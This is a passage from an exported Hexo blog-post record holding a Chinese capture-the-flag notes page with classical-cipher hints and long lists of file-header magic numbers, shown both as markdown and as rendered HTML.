Express (dbx)，文件头：CFAD12FEC5FD746F\n\n   Outlook (pst)，文件头：2142444E\n\n   zlib                                       789C  x\\xda\n\n   gzip                                       1f8b08\n\n   lzma                                                         6c00                                                                 \n\n   MS Word/Excel (xls.or.doc)，文件头：D0CF11E0\n\n   MS Access (mdb)，文件头：5374616E64617264204A\n\n   WordPerfect (wpd)，文件头：FF575043\n\n   Postscript (eps.or.ps)，文件头：252150532D41646F6265\n\n   Adobe Acrobat (pdf)，文件头：255044462D312E\n\n   Quicken (qdf)，文件头：AC9EBD8F\n\n   Windows Password (pwl)，文件头：E3828596\n\n   ZIP Archive (zip)，文件头：504B0304\n\n   RAR Archive (rar)，文件头：52617221\n\n   Wave (wav)，文件头：57415645\n\n   AVI (avi)，文件头：41564920\n\n   Real Audio (ram)，文件头：2E7261FD\n\n   Real Media (rm)，文件头：2E524D46\n\n   MPEG (mpg)，文件头：000001BA\n\n   MPEG (mpg)，文件头：000001B3\n\n   Quicktime (mov)，文件头：6D6F6F76\n\n   Windows Media (asf)，文件头：3026B2758E66CF11\n\n   MIDI (mid)，文件头：4D546864\n\n5. 从winhex中取出的文件头列表\n\n   File Type ExtensionsHeader\n\n   JPEG jpg;jpeg 0xFFD8FF\n\n   PNG png 0x89504E470D0A1A0A\n\n   GIF gif GIF8\n\n   TIFF tif;tiff 0x49492A00\n\n   TIFF tif;tiff 0x4D4D002A\n\n   Bit map bmp BM\n\n   AOL ART art 0x4A47040E000000\n\n   AOL ART art 0x4A47030E000000\n\n   PC Paintbrush pcx 0x0A050108\n\n   Graphics Metafile wmf 0xD7CDC69A\n\n   Graphics Metafile wmf 0x01000900\n\n   Graphics Metafile wmf 0x02000900\n\n   Enhanced Metafile emf 0x0100000058000000\n\n   Corel Draw cdr CDR\n\n   CAD dwg 0x41433130\n\n   Adobe Photoshop psd 8BPS\n\n   Rich Text Format rtf rtf\n\n   XML xml\n\n   HTML html;htm;[PHP](http://lib.csdn.net/base/php);php3;php4;phtml;shtml type\n\n   Email eml Delivery-date:\n\n   Outlook Express dbx 0xCFAD12FE\n\n   Outlookpst!BDN\n\n   MS Office/OLE2doc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db 0xD0CF11E0A1B11AE1\n\n   MS Access mdb;mda;mde;mdt Standard J\n\n   WordPerfect wpd 0xFF575043\n\n   OpenOffice Writer sxw writer\n\n   OpenOffice Calc sxc calc\n\n   OpenOffice Math sxm math\n\n   OpenOffice Impress sxi impress\n\n   OpenOffice Draw sxd draw\n\n   Adobe FrameMaker fm <MAKERFILE\n\n   PostScript eps.or.ps;ps;eps %!PS-Adobe\n\n   Adobe Acrobat pdf %PDF-1.\n\n   Quicken qdf 0xAC9EBD8F\n\n   QuickBooks Backup qbb 0x458600000600\n\n   Sage sly.or.srt.or.slt;sly;srt;slt0x53520100\n\n   Sage Backup 1 SAGEBACKUP\n\n   Lotus WordPro v9 lwp 0x576F726450726F\n\n   Lotus 123 v9 123 0x00001A00051004\n\n   Lotus 123 v5 wk4 0x00001A0002100400\n\n   Lotus 123 v3 wk3 0x00001A0000100400\n\n   Lotus 123 v1 wk1 0x2000604060\n\n   Windows Password pwl 0xE3828596\n\n   ZIP Archive zip;jar 0x504B0304\n\n   ZIP Archive (outdated) zip 0x504B3030\n\n   RAR Archive rar Rar!\n\n   GZ Archive gz;tgz 0x1F8B08\n\n   BZIP Archive bz2 BZh\n\n   ARJ Archive arj 0x60EA\n\n   7-ZIP Archive 7z 7z集'\n\n   Wave wav WAVE\n\n   AVI avi AVI\n\n   Real Audio ram;ra .ra?0\n\n   Real Media rm .RMF\n\n   MPEG mpg;mpeg 0x000001BA\n\n   MPEG mpg;mpeg 0x000001B3\n\n   Quicktime mov moov\n\n   Windows Media asf 0x3026B2758E66CF11\n\n   MIDI mid MThd\n\n   Win32 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ\n\n   Win16 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ\n\n   ELF Executable elf;; 0x7F454C4601010100\n\n6. 各种文件类型文件头标志位详细列表 \n\n   FFD8FFFE00, .JPEG;.JPE;.JPG, \"JPGGraphic File\"\n\n   FFD8FFE000, .JPEG;.JPE;.JPG, \"JPGGraphic File\"\n\n   474946383961, .gif, \"GIF 89A\"\n\n   474946383761, .gif, \"GIF 87A\"\n\n   424D, .bmp, \"Windows Bitmap\"\n\n   4D5A,.exe;.com;.386;.ax;.acm;.sys;.dll;.drv;.flt;.fon;.ocx;.scr;.lrc;.vxd;\n\n   .cpl;.x32, \"Executable File\"\n\n   504B0304, .zip, \"Zip Compressed\"\n\n   3A42617365, .cnt, \"\"\n\n   D0CF11E0A1B11AE1,.doc;.xls;.xlt;.ppt;.apr, \"MS Compound Document v1 or Lotus Approach APRfile\"\n\n   0100000058000000, .emf, \"\"\n\n   03000000C466C456, .evt, \"\"\n\n   3F5F0300, .gid;.hlp;.lhp, \"Windows HelpFile\"\n\n   1F8B08, .gz, \"GZ Compressed File\"\n\n   28546869732066696C65, .hqx, \"\"\n\n   0000010000, .ico, \"Icon File\"\n\n   4C000000011402, .lnk, \"Windows LinkFile\"\n\n   25504446, .pdf, \"Adobe PDF File\"\n\n   5245474544495434, .reg, \"\"\n\n   7B5C727466,.rtf, \"Rich Text Format File\"\n\n   lh, .lzh, \"Lz compression file\"\n\n   MThd, .mid, \"\"\n\n   0A050108, .pcx, \"\"\n\n   25215053, .eps, \"Adobe EPS File\"\n\n   2112, .ain, \"AIN Archive File\"\n\n   1A02, .arc, \"ARC/PKPAK Compressed 1\"\n\n   1A03, .arc, \"ARC/PKPAK Compressed 2\"\n\n   1A04, .arc, \"ARC/PKPAK Compressed 3\"\n\n   1A08, .arc, \"ARC/PKPAK Compressed 4\"\n\n   1A09, .arc, \"ARC/PKPAK Compressed 5\"\n\n   60EA, .arj, \"ARJ Compressed\"\n\n   41564920, .avi, \"Audio Video Interleave(AVI)\"\n\n   425A68, .bz;.bz2, \"Bzip Archive\"\n\n   49536328, .cab, \"Cabinet File\"\n\n   4C01, .obj, \"Compiled Object Module\"\n\n   303730373037, .tar;.cpio, \"CPIO ArchiveFile\"\n\n   4352555348, .cru;.crush, \"CRUSH ArchiveFile\"\n\n   3ADE68B1, .dcx, \"DCX Graphic File\"\n\n   1F8B, .gz;.tar;.tgz, \"Gzip ArchiveFile\"\n\n   91334846, .hap, \"HAP Archive File\"\n\n   3C68746D6C3E,.htm;.html, \"HyperText Markup Language 1\"\n\n   3C48544D4C3E,.htm;.html, \"HyperText Markup Language 2\"\n\n   3C21444F4354, .htm;.html, \"HyperText MarkupLanguage 3\"\n\n   100, .ico, \"ICON File\"\n\n   5F27A889, .jar, \"JAR Archive File\"\n\n   2D6C68352D,.lha, \"LHA Compressed\"\n\n   20006040600, .wk1;.wks, \"Lotus 123 v1 Worksheet\"\n\n   00001A0007800100, .fm3, \"Lotus 123 v3 FMTfile\"\n\n   00001A0000100400, .wk3, \"Lotus 123 v3Worksheet\"\n\n   20006800200, .fmt, \"Lotus 123 v4 FMTfile\"\n\n   00001A0002100400, .wk4, \"Lotus 123 v5\"\n\n   5B7665725D, .ami, \"Lotus Ami Pro\"\n\n   300000041505052, .adx, \"Lotus ApproachADX file\"\n\n   1A0000030000, .nsf;.ntf, \"Lotus NotesDatabase/Template\"\n\n   4D47582069747064, .ds4, \"MicrografixDesigner 4\"\n\n   4D534346, .cab, \"Microsoft CAB FileFormat\"\n\n   4D546864, .mid, \"Midi Audio File\"\n\n   000001B3, .mpg;.mpeg, \"MPEG Movie\"\n\n   0902060000001000B9045C00, .xls, \"MS Excel v2\"\n\n   0904060000001000F6055C00, .xls, \"MS Excel v4\"\n\n   7FFE340A,.doc, \"MS Word\"\n\n   1234567890FF, .doc, \"MS Word 6.0\"\n\n   31BE000000AB0000, .doc, \"MS Word forDOS 6.0\"\n\n   1A00000300001100, .nsf, \"NotesDatabase\"\n\n   7E424B00, .psp, \"PaintShop Pro Image File\"\n\n   504B0304, .zip, \"PKZIP Compressed\"\n\n   89504E470D0A, .png, \"PNG Image File\"\n\n   6D646174, .mov, \"QuickTime Movie\"\n\n   6D646174, .qt, \"Quicktime MovieFile\"\n\n   52617221, .rar, \"RAR Archive File\"\n\n   2E7261FD, .ra;.ram, \"Real AudioFile\"\n\n   EDABEEDB, .rpm, \"RPM Archive File\"\n\n   2E736E64, .au, \"SoundMachine AudioFile\"\n\n   53495421, .sit, \"Stuffit v1 ArchiveFile\"\n\n   53747566664974, .sit, \"Stuffit v5Archive File\"\n\n   1F9D, .z, \"TAR Compressed ArchiveFile\"\n\n   49492A, .tif;.tiff, \"TIFF (Intel)\"\n\n   4D4D2A,.tif;.tiff, \"TIFF (Motorola)\"\n\n   554641, .ufa, \"UFA Archive File\"\n\n   57415645666D74, .wav, \"Wave Files\"\n\n   D7CDC69A,.wmf, \"Windows Meta File\"\n\n   4C000000, .lnk, \"Windows Shortcut (LinkFile)\"\n\n   504B3030504B0304, .zip, \"WINZIPCompressed\"\n\n   FF575047, .wpg, \"WordPerfectGraphics\"\n\n   FF575043, .wp, \"WordPerfect v5 orv6\"\n\n   3C3F786D6C,.xml, \"XML Document\"\n\n   FFFE3C0052004F004F0054005300540055004200, .xml, \"XML Document(ROOTSTUB)\"\n\n   3C21454E54495459, .dtd, \"XML DTD\"\n\n   5A4F4F20, .zoo, \"ZOO Archive File\"\n\n7. 如果有fireworks的字样，可以使用Adobe Fireworks打开\n\n8. U2Fsd特征易知是AES加密的密文,使用解密网站，密钥为空","source":"_posts/misc思路.md","raw":"---\ntitle: misc思路\ndate: 2018-05-07 11:05:07\ntags: ctf\n---\n\n1. 凯撒13世 rot13\n\n2. roqtp697t95j3 对应键盘下一行\n\n3. 栅栏密码\n\n   <!-- more -->\n\n4. 各种文件头\n\n   JPEG (jpg)，文件头：FFD8FF\n\n   PNG (png)，文件头：89504E47\n\n   GIF (gif)，文件头：47494638\n\n   TIFF (tif)，文件头：49492A00\n\n   Windows Bitmap (bmp)，文件头：424D\n\n   CAD (dwg)，文件头：41433130\n\n   Adobe Photoshop (psd)，文件头：38425053\n\n   Rich Text Format (rtf)，文件头：7B5C727466\n\n   XML (xml)，文件头：3C3F786D6C\n\n   HTML (html)，文件头：68746D6C3E\n\n   Email [thorough only] (eml)，文件头：44656C69766572792D646174653A\n\n   Outlook Express (dbx)，文件头：CFAD12FEC5FD746F\n\n   Outlook (pst)，文件头：2142444E\n\n   zlib                                       789C  x\\xda\n\n   gzip                                       1f8b08\n\n   lzma                                                         6c00                                                                 \n\n   MS Word/Excel (xls.or.doc)，文件头：D0CF11E0\n\n   MS Access (mdb)，文件头：5374616E64617264204A\n\n   WordPerfect (wpd)，文件头：FF575043\n\n   Postscript (eps.or.ps)，文件头：252150532D41646F6265\n\n   Adobe Acrobat (pdf)，文件头：255044462D312E\n\n   Quicken (qdf)，文件头：AC9EBD8F\n\n   Windows Password (pwl)，文件头：E3828596\n\n   ZIP Archive (zip)，文件头：504B0304\n\n   RAR Archive (rar)，文件头：52617221\n\n   Wave (wav)，文件头：57415645\n\n   AVI (avi)，文件头：41564920\n\n   Real Audio (ram)，文件头：2E7261FD\n\n   Real Media (rm)，文件头：2E524D46\n\n   MPEG (mpg)，文件头：000001BA\n\n   MPEG (mpg)，文件头：000001B3\n\n   Quicktime (mov)，文件头：6D6F6F76\n\n   Windows Media (asf)，文件头：3026B2758E66CF11\n\n   MIDI (mid)，文件头：4D546864\n\n5. 从winhex中取出的文件头列表\n\n   File Type ExtensionsHeader\n\n   JPEG jpg;jpeg 0xFFD8FF\n\n   PNG png 0x89504E470D0A1A0A\n\n   GIF gif GIF8\n\n   TIFF tif;tiff 0x49492A00\n\n   TIFF tif;tiff 0x4D4D002A\n\n   Bit map bmp BM\n\n   AOL ART art 0x4A47040E000000\n\n   AOL ART art 0x4A47030E000000\n\n   PC Paintbrush pcx 0x0A050108\n\n   Graphics Metafile wmf 0xD7CDC69A\n\n   Graphics Metafile wmf 0x01000900\n\n   Graphics Metafile wmf 0x02000900\n\n   Enhanced Metafile emf 0x0100000058000000\n\n   Corel Draw cdr CDR\n\n   CAD dwg 0x41433130\n\n   Adobe Photoshop psd 8BPS\n\n   Rich Text Format rtf rtf\n\n   XML xml\n\n   HTML html;htm;[PHP](http://lib.csdn.net/base/php);php3;php4;phtml;shtml type\n\n   Email eml Delivery-date:\n\n   Outlook Express dbx 0xCFAD12FE\n\n   Outlookpst!BDN\n\n   MS Office/OLE2doc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db 0xD0CF11E0A1B11AE1\n\n   MS Access mdb;mda;mde;mdt Standard J\n\n   WordPerfect wpd 0xFF575043\n\n   OpenOffice Writer sxw writer\n\n   OpenOffice Calc sxc calc\n\n   OpenOffice Math sxm math\n\n   OpenOffice Impress sxi impress\n\n   OpenOffice Draw sxd draw\n\n   Adobe FrameMaker fm <MAKERFILE\n\n   PostScript eps.or.ps;ps;eps %!PS-Adobe\n\n   Adobe Acrobat pdf %PDF-1.\n\n   Quicken qdf 0xAC9EBD8F\n\n   QuickBooks Backup qbb 0x458600000600\n\n   Sage sly.or.srt.or.slt;sly;srt;slt0x53520100\n\n   Sage Backup 1 SAGEBACKUP\n\n   Lotus WordPro v9 lwp 0x576F726450726F\n\n   Lotus 123 v9 123 0x00001A00051004\n\n   Lotus 123 v5 wk4 0x00001A0002100400\n\n   Lotus 123 v3 wk3 0x00001A0000100400\n\n   Lotus 123 v1 wk1 0x2000604060\n\n   Windows Password pwl 0xE3828596\n\n   ZIP Archive zip;jar 0x504B0304\n\n   ZIP Archive (outdated) zip 0x504B3030\n\n   RAR Archive rar Rar!\n\n   GZ Archive gz;tgz 0x1F8B08\n\n   BZIP Archive bz2 BZh\n\n   ARJ Archive arj 0x60EA\n\n   7-ZIP Archive 7z 7z集'\n\n   Wave wav WAVE\n\n   AVI avi AVI\n\n   Real Audio ram;ra .ra?0\n\n   Real Media rm .RMF\n\n   MPEG mpg;mpeg 0x000001BA\n\n   MPEG mpg;mpeg 0x000001B3\n\n   Quicktime mov moov\n\n   Windows Media asf 0x3026B2758E66CF11\n\n   MIDI mid MThd\n\n   Win32 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ\n\n   Win16 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ\n\n   ELF Executable elf;; 0x7F454C4601010100\n\n6. 各种文件类型文件头标志位详细列表 \n\n   FFD8FFFE00, .JPEG;.JPE;.JPG, \"JPGGraphic File\"\n\n   FFD8FFE000, .JPEG;.JPE;.JPG, \"JPGGraphic File\"\n\n   474946383961, .gif, \"GIF 89A\"\n\n   474946383761, .gif, \"GIF 87A\"\n\n   424D, .bmp, \"Windows Bitmap\"\n\n   4D5A,.exe;.com;.386;.ax;.acm;.sys;.dll;.drv;.flt;.fon;.ocx;.scr;.lrc;.vxd;\n\n   .cpl;.x32, \"Executable File\"\n\n   504B0304, .zip, \"Zip Compressed\"\n\n   3A42617365, .cnt, \"\"\n\n   D0CF11E0A1B11AE1,.doc;.xls;.xlt;.ppt;.apr, \"MS Compound Document v1 or Lotus Approach APRfile\"\n\n   0100000058000000, .emf, \"\"\n\n   03000000C466C456, .evt, \"\"\n\n   3F5F0300, .gid;.hlp;.lhp, \"Windows HelpFile\"\n\n   1F8B08, .gz, \"GZ Compressed File\"\n\n   28546869732066696C65, .hqx, \"\"\n\n   0000010000, .ico, \"Icon File\"\n\n   4C000000011402, .lnk, \"Windows LinkFile\"\n\n   25504446, .pdf, \"Adobe PDF File\"\n\n   5245474544495434, .reg, \"\"\n\n   7B5C727466,.rtf, \"Rich Text Format File\"\n\n   lh, .lzh, \"Lz compression file\"\n\n   MThd, .mid, \"\"\n\n   0A050108, .pcx, \"\"\n\n   25215053, .eps, \"Adobe EPS File\"\n\n   2112, .ain, \"AIN Archive File\"\n\n   1A02, .arc, \"ARC/PKPAK Compressed 1\"\n\n   1A03, .arc, \"ARC/PKPAK Compressed 2\"\n\n   1A04, .arc, \"ARC/PKPAK Compressed 3\"\n\n   1A08, .arc, \"ARC/PKPAK Compressed 4\"\n\n   1A09, .arc, \"ARC/PKPAK Compressed 5\"\n\n   60EA, .arj, \"ARJ Compressed\"\n\n   41564920, .avi, \"Audio Video Interleave(AVI)\"\n\n   425A68, .bz;.bz2, \"Bzip Archive\"\n\n   49536328, .cab, \"Cabinet File\"\n\n   4C01, .obj, \"Compiled Object Module\"\n\n   303730373037, .tar;.cpio, \"CPIO ArchiveFile\"\n\n   4352555348, .cru;.crush, \"CRUSH ArchiveFile\"\n\n   3ADE68B1, .dcx, \"DCX Graphic File\"\n\n   1F8B, .gz;.tar;.tgz, \"Gzip ArchiveFile\"\n\n   91334846, .hap, \"HAP Archive File\"\n\n   3C68746D6C3E,.htm;.html, \"HyperText Markup Language 1\"\n\n   3C48544D4C3E,.htm;.html, \"HyperText Markup Language 2\"\n\n   3C21444F4354, .htm;.html, \"HyperText MarkupLanguage 3\"\n\n   100, .ico, \"ICON File\"\n\n   5F27A889, .jar, \"JAR Archive File\"\n\n   2D6C68352D,.lha, \"LHA Compressed\"\n\n   20006040600, .wk1;.wks, \"Lotus 123 v1 Worksheet\"\n\n   00001A0007800100, .fm3, \"Lotus 123 v3 FMTfile\"\n\n   00001A0000100400, .wk3, \"Lotus 123 v3Worksheet\"\n\n   20006800200, .fmt, \"Lotus 123 v4 FMTfile\"\n\n   00001A0002100400, .wk4, \"Lotus 123 v5\"\n\n   5B7665725D, .ami, \"Lotus Ami Pro\"\n\n   300000041505052, .adx, \"Lotus ApproachADX file\"\n\n   1A0000030000, .nsf;.ntf, \"Lotus NotesDatabase/Template\"\n\n   4D47582069747064, .ds4, \"MicrografixDesigner 4\"\n\n   4D534346, .cab, \"Microsoft CAB FileFormat\"\n\n   4D546864, .mid, \"Midi Audio File\"\n\n   000001B3, .mpg;.mpeg, \"MPEG Movie\"\n\n   0902060000001000B9045C00, .xls, \"MS Excel v2\"\n\n   0904060000001000F6055C00, .xls, \"MS Excel v4\"\n\n   7FFE340A,.doc, \"MS Word\"\n\n   1234567890FF, .doc, \"MS Word 6.0\"\n\n   31BE000000AB0000, .doc, \"MS Word forDOS 6.0\"\n\n   1A00000300001100, .nsf, \"NotesDatabase\"\n\n   7E424B00, .psp, \"PaintShop Pro Image File\"\n\n   504B0304, .zip, \"PKZIP Compressed\"\n\n   89504E470D0A, .png, \"PNG Image File\"\n\n   6D646174, .mov, \"QuickTime Movie\"\n\n   6D646174, .qt, \"Quicktime MovieFile\"\n\n   52617221, .rar, \"RAR Archive File\"\n\n   2E7261FD, .ra;.ram, \"Real AudioFile\"\n\n   EDABEEDB, .rpm, \"RPM Archive File\"\n\n   2E736E64, .au, \"SoundMachine AudioFile\"\n\n   53495421, .sit, \"Stuffit v1 ArchiveFile\"\n\n   53747566664974, .sit, \"Stuffit v5Archive File\"\n\n   1F9D, .z, \"TAR Compressed ArchiveFile\"\n\n   49492A, .tif;.tiff, \"TIFF (Intel)\"\n\n   4D4D2A,.tif;.tiff, \"TIFF (Motorola)\"\n\n   554641, .ufa, \"UFA Archive File\"\n\n   57415645666D74, .wav, \"Wave Files\"\n\n   D7CDC69A,.wmf, \"Windows Meta File\"\n\n   4C000000, .lnk, \"Windows Shortcut (LinkFile)\"\n\n   504B3030504B0304, .zip, \"WINZIPCompressed\"\n\n   FF575047, .wpg, \"WordPerfectGraphics\"\n\n   FF575043, .wp, \"WordPerfect v5 orv6\"\n\n   3C3F786D6C,.xml, \"XML Document\"\n\n   FFFE3C0052004F004F0054005300540055004200, .xml, \"XML Document(ROOTSTUB)\"\n\n   3C21454E54495459, .dtd, \"XML DTD\"\n\n   5A4F4F20, .zoo, \"ZOO Archive File\"\n\n7. 如果有fireworks的字样，可以使用Adobe Fireworks打开\n\n8. U2Fsd特征易知是AES加密的密文,使用解密网站，密钥为空","slug":"misc思路","published":1,"updated":"2018-06-25T12:00:14.747Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12ha000lqkdl6ozynns7","content":"<ol>\n<li><p>凯撒13世 rot13</p>\n</li>\n<li><p>roqtp697t95j3 对应键盘下一行</p>\n</li>\n<li><p>栅栏密码</p>\n<a id=\"more\"></a>\n</li>\n<li><p>各种文件头</p>\n<p>JPEG (jpg)，文件头：FFD8FF</p>\n<p>PNG (png)，文件头：89504E47</p>\n<p>GIF (gif)，文件头：47494638</p>\n<p>TIFF (tif)，文件头：49492A00</p>\n<p>Windows Bitmap (bmp)，文件头：424D</p>\n<p>CAD (dwg)，文件头：41433130</p>\n<p>Adobe Photoshop (psd)，文件头：38425053</p>\n<p>Rich Text Format (rtf)，文件头：7B5C727466</p>\n<p>XML (xml)，文件头：3C3F786D6C</p>\n<p>HTML (html)，文件头：68746D6C3E</p>\n<p>Email [thorough only] (eml)，文件头：44656C69766572792D646174653A</p>\n<p>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F</p>\n<p>Outlook (pst)，文件头：2142444E</p>\n<p>zlib                                       789C  x\\xda</p>\n<p>gzip                                       1f8b08</p>\n<p>lzma                                                         6c00                                                                 </p>\n<p>MS Word/Excel (xls.or.doc)，文件头：D0CF11E0</p>\n<p>MS Access (mdb)，文件头：5374616E64617264204A</p>\n<p>WordPerfect (wpd)，文件头：FF575043</p>\n<p>Postscript (eps.or.ps)，文件头：252150532D41646F6265</p>\n<p>Adobe Acrobat (pdf)，文件头：255044462D312E</p>\n<p>Quicken (qdf)，文件头：AC9EBD8F</p>\n<p>Windows Password (pwl)，文件头：E3828596</p>\n<p>ZIP Archive (zip)，文件头：504B0304</p>\n<p>RAR Archive (rar)，文件头：52617221</p>\n<p>Wave (wav)，文件头：57415645</p>\n<p>AVI (avi)，文件头：41564920</p>\n<p>Real Audio (ram)，文件头：2E7261FD</p>\n<p>Real Media (rm)，文件头：2E524D46</p>\n<p>MPEG (mpg)，文件头：000001BA</p>\n<p>MPEG (mpg)，文件头：000001B3</p>\n<p>Quicktime (mov)，文件头：6D6F6F76</p>\n<p>Windows Media (asf)，文件头：3026B2758E66CF11</p>\n<p>MIDI (mid)，文件头：4D546864</p>\n</li>\n<li><p>从winhex中取出的文件头列表</p>\n<p>File Type ExtensionsHeader</p>\n<p>JPEG jpg;jpeg 0xFFD8FF</p>\n<p>PNG png 0x89504E470D0A1A0A</p>\n<p>GIF gif GIF8</p>\n<p>TIFF tif;tiff 0x49492A00</p>\n<p>TIFF tif;tiff 0x4D4D002A</p>\n<p>Bit map bmp BM</p>\n<p>AOL ART art 0x4A47040E000000</p>\n<p>AOL ART art 0x4A47030E000000</p>\n<p>PC Paintbrush pcx 0x0A050108</p>\n<p>Graphics Metafile wmf 0xD7CDC69A</p>\n<p>Graphics Metafile wmf 0x01000900</p>\n<p>Graphics Metafile wmf 0x02000900</p>\n<p>Enhanced Metafile emf 0x0100000058000000</p>\n<p>Corel Draw cdr CDR</p>\n<p>CAD dwg 0x41433130</p>\n<p>Adobe Photoshop psd 8BPS</p>\n<p>Rich Text Format rtf rtf</p>\n<p>XML xml</p>\n<p>HTML html;htm;<a href=\"http://lib.csdn.net/base/php\" target=\"_blank\" rel=\"noopener\">PHP</a>;php3;php4;phtml;shtml type</p>\n<p>Email eml Delivery-date:</p>\n<p>Outlook Express dbx 0xCFAD12FE</p>\n<p>Outlookpst!BDN</p>\n<p>MS Office/OLE2doc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db 0xD0CF11E0A1B11AE1</p>\n<p>MS Access mdb;mda;mde;mdt Standard J</p>\n<p>WordPerfect wpd 0xFF575043</p>\n<p>OpenOffice Writer sxw writer</p>\n<p>OpenOffice Calc sxc calc</p>\n<p>OpenOffice Math sxm math</p>\n<p>OpenOffice Impress sxi impress</p>\n<p>OpenOffice Draw sxd draw</p>\n<p>Adobe FrameMaker fm &lt;MAKERFILE</p>\n<p>PostScript eps.or.ps;ps;eps %!PS-Adobe</p>\n<p>Adobe Acrobat pdf %PDF-1.</p>\n<p>Quicken qdf 0xAC9EBD8F</p>\n<p>QuickBooks Backup qbb 0x458600000600</p>\n<p>Sage sly.or.srt.or.slt;sly;srt;slt0x53520100</p>\n<p>Sage Backup 1 SAGEBACKUP</p>\n<p>Lotus WordPro v9 lwp 0x576F726450726F</p>\n<p>Lotus 123 v9 123 0x00001A00051004</p>\n<p>Lotus 123 v5 wk4 0x00001A0002100400</p>\n<p>Lotus 123 v3 wk3 0x00001A0000100400</p>\n<p>Lotus 123 v1 wk1 0x2000604060</p>\n<p>Windows Password pwl 0xE3828596</p>\n<p>ZIP Archive zip;jar 0x504B0304</p>\n<p>ZIP Archive (outdated) zip 0x504B3030</p>\n<p>RAR Archive rar Rar!</p>\n<p>GZ Archive gz;tgz 0x1F8B08</p>\n<p>BZIP Archive bz2 BZh</p>\n<p>ARJ Archive arj 0x60EA</p>\n<p>7-ZIP Archive 7z 7z集’</p>\n<p>Wave wav WAVE</p>\n<p>AVI avi AVI</p>\n<p>Real Audio ram;ra .ra?0</p>\n<p>Real Media rm .RMF</p>\n<p>MPEG mpg;mpeg 0x000001BA</p>\n<p>MPEG mpg;mpeg 0x000001B3</p>\n<p>Quicktime mov moov</p>\n<p>Windows Media asf 0x3026B2758E66CF11</p>\n<p>MIDI mid MThd</p>\n<p>Win32 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ</p>\n<p>Win16 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ</p>\n<p>ELF Executable elf;; 0x7F454C4601010100</p>\n</li>\n<li><p>各种文件类型文件头标志位详细列表 </p>\n<p>FFD8FFFE00, .JPEG;.JPE;.JPG, “JPGGraphic File”</p>\n<p>FFD8FFE000, .JPEG;.JPE;.JPG, “JPGGraphic File”</p>\n<p>474946383961, .gif, “GIF 89A”</p>\n<p>474946383761, .gif, “GIF 87A”</p>\n<p>424D, .bmp, “Windows Bitmap”</p>\n<p>4D5A,.exe;.com;.386;.ax;.acm;.sys;.dll;.drv;.flt;.fon;.ocx;.scr;.lrc;.vxd;</p>\n<p>.cpl;.x32, “Executable File”</p>\n<p>504B0304, .zip, “Zip Compressed”</p>\n<p>3A42617365, .cnt, “”</p>\n<p>D0CF11E0A1B11AE1,.doc;.xls;.xlt;.ppt;.apr, “MS Compound Document v1 or Lotus Approach APRfile”</p>\n<p>0100000058000000, .emf, “”</p>\n<p>03000000C466C456, .evt, “”</p>\n<p>3F5F0300, .gid;.hlp;.lhp, “Windows HelpFile”</p>\n<p>1F8B08, .gz, “GZ Compressed File”</p>\n<p>28546869732066696C65, .hqx, “”</p>\n<p>0000010000, .ico, “Icon File”</p>\n<p>4C000000011402, .lnk, “Windows LinkFile”</p>\n<p>25504446, .pdf, “Adobe PDF File”</p>\n<p>5245474544495434, .reg, “”</p>\n<p>7B5C727466,.rtf, “Rich Text Format File”</p>\n<p>lh, .lzh, “Lz compression file”</p>\n<p>MThd, .mid, “”</p>\n<p>0A050108, .pcx, “”</p>\n<p>25215053, .eps, “Adobe EPS File”</p>\n<p>2112, .ain, “AIN Archive File”</p>\n<p>1A02, .arc, “ARC/PKPAK Compressed 1”</p>\n<p>1A03, .arc, “ARC/PKPAK Compressed 2”</p>\n<p>1A04, .arc, “ARC/PKPAK Compressed 3”</p>\n<p>1A08, .arc, “ARC/PKPAK Compressed 4”</p>\n<p>1A09, .arc, “ARC/PKPAK Compressed 5”</p>\n<p>60EA, .arj, “ARJ Compressed”</p>\n<p>41564920, .avi, “Audio Video Interleave(AVI)”</p>\n<p>425A68, .bz;.bz2, “Bzip Archive”</p>\n<p>49536328, .cab, “Cabinet File”</p>\n<p>4C01, .obj, “Compiled Object Module”</p>\n<p>303730373037, .tar;.cpio, “CPIO ArchiveFile”</p>\n<p>4352555348, .cru;.crush, “CRUSH ArchiveFile”</p>\n<p>3ADE68B1, .dcx, “DCX Graphic File”</p>\n<p>1F8B, .gz;.tar;.tgz, “Gzip ArchiveFile”</p>\n<p>91334846, .hap, “HAP Archive File”</p>\n<p>3C68746D6C3E,.htm;.html, “HyperText Markup Language 1”</p>\n<p>3C48544D4C3E,.htm;.html, “HyperText Markup Language 2”</p>\n<p>3C21444F4354, .htm;.html, “HyperText MarkupLanguage 3”</p>\n<p>100, .ico, “ICON File”</p>\n<p>5F27A889, .jar, “JAR Archive File”</p>\n<p>2D6C68352D,.lha, “LHA Compressed”</p>\n<p>20006040600, .wk1;.wks, “Lotus 123 v1 Worksheet”</p>\n<p>00001A0007800100, .fm3, “Lotus 123 v3 FMTfile”</p>\n<p>00001A0000100400, .wk3, “Lotus 123 v3Worksheet”</p>\n<p>20006800200, .fmt, “Lotus 123 v4 FMTfile”</p>\n<p>00001A0002100400, .wk4, “Lotus 123 v5”</p>\n<p>5B7665725D, .ami, “Lotus Ami Pro”</p>\n<p>300000041505052, .adx, “Lotus ApproachADX file”</p>\n<p>1A0000030000, .nsf;.ntf, “Lotus NotesDatabase/Template”</p>\n<p>4D47582069747064, .ds4, “MicrografixDesigner 4”</p>\n<p>4D534346, .cab, “Microsoft CAB FileFormat”</p>\n<p>4D546864, .mid, “Midi Audio File”</p>\n<p>000001B3, .mpg;.mpeg, “MPEG Movie”</p>\n<p>0902060000001000B9045C00, .xls, “MS Excel v2”</p>\n<p>0904060000001000F6055C00, .xls, “MS Excel v4”</p>\n<p>7FFE340A,.doc, “MS Word”</p>\n<p>1234567890FF, .doc, “MS Word 6.0”</p>\n<p>31BE000000AB0000, .doc, “MS Word forDOS 6.0”</p>\n<p>1A00000300001100, .nsf, “NotesDatabase”</p>\n<p>7E424B00, .psp, “PaintShop Pro Image File”</p>\n<p>504B0304, .zip, “PKZIP Compressed”</p>\n<p>89504E470D0A, .png, “PNG Image File”</p>\n<p>6D646174, .mov, “QuickTime 